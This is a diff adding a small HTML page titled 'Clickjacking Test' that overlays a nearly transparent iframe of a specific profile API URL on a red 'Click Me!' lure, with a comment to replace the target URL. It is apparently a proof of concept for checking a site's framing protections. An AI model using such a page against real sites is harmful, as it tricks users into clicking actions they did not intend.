@@ -1,0 +1,29 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>Clickjacking Test</title>
+  <style>
+    iframe {
+      position: absolute;
+      width: 800px;
+      height: 600px;
+      opacity: 0.1; /* make it transparent */
+      z-index: 2;
+    }
+    #click {
+      position: absolute;
+      top: 100px;
+      left: 100px;
+      z-index: 1;
+      background-color: red;
+      padding: 20px;
+      color: white;
+      font-size: 20px;
+    }
+  </style>
+</head>
+<body>
+  <h1 id="click">Click Me!</h1>
+  <iframe src="https://bingo-api.cubestagearea.xyz/api/users/profile"></iframe> <!-- Replace with target URL -->
+</body>
+</html>
